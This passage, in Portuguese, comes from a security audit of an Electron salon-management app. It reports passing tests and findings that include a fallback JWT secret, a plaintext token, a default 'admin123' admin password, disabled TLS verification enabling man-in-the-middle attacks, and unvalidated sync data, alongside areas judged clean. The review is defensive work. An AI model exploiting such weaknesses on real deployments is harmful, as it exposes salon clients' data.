- `SoftHair/INSTALL.md` (E4 setup wizard, E14 doc)

### Tests
- SOFT-HAIR-SERVER: `npm test -- --runInBand` → 3 suites passed, 9 tests passed.
- Syntax check Node `-c` em todos os arquivos modificados: OK.
- Frontend Vite build: OK.

### Descobertas-chave

1. **Sync está fundamentalmente quebrado em contrato** (E5) — o client envia `{tabela: [rows]}`, o server espera `[{table, operation, data}]`. O sync provavelmente NUNCA funcionou de fato em produção. Qualquer fix apressado sem alinhar IDs locais/remotos vai corromper dados cross-salão.

2. **Cadeia de credenciais frágil**: JWT_SECRET com fallback dev (E1) + token cloud em plaintext no JSON sem chmod (E2) + senha admin default `admin123` (E8) + toggle off não limpa nada (E9). Um malware infostealer simples drena tudo.

3. **Sem HTTPS forçado, sem cert pinning, com `rejectUnauthorized:false`** (E3) — o sync é MITM-able trivialmente. Em rede de café/aeroporto, atacante captura todos os clientes e profissionais do salão.

4. **Sync pull aplica payload do server sem validação** (E6) — server malicioso ou hijack DNS controla 100% do banco local; pode inclusive injetar `senha_hash` em `profissionais`.

5. **Process lifecycle fragil** (E10, E11): backend zombi + sem single-instance lock → SQLite corrompido + UI fala com backend de versão errada.

6. **Boas práticas Electron em ordem mas com gaps**: `nodeIntegration: false`, `contextIsolation: true`, `webSecurity: true` (default) — todas corretas. Faltam: `setWindowOpenHandler`, `will-navigate` para HTTPS, CSP, sandbox: true (não setado mas default em Electron 20+ recente), signing.

### Areas verificadas limpas

- **Bind do backend embarcado**: `HOST=127.0.0.1` é forçado pelo main.js em produção (`electron/main.js:59`).
- **SQL injection**: queries usam placeholders `?` consistentemente. O adapter converte para `$N` no Postgres. Não vi string concatenation em valores.
- **`webPreferences`**: `nodeIntegration: false`, `contextIsolation: true`, sem `webSecurity: false`, sem `allowRunningInsecureContent`.
- **Helmet**: ativado (com CSP off, ver E13).
- **bcrypt cost**: 10 (razoável).
- **Validação de input**: `express-validator` aplicado em POST/PUT principais (auth, clientes, profissionais, servicos, produtos, agendamentos, atendimentos, vendas).
- **Multi-tenancy interno**: todas as rotas filtram por `salao_id = req.salaoId` (extraído do JWT) — não vi rota vazando dados de outro salão.
- **Transações**: vendas usam `withTransaction` para múltiplos INSERTs + UPDATEs de estoque (apesar de E30, o caminho atual é síncrono em sqlite e funciona).
- **Frontend Sync.jsx**: mascara token como `type="password"` na UI, não exibe em texto claro no modo edição.
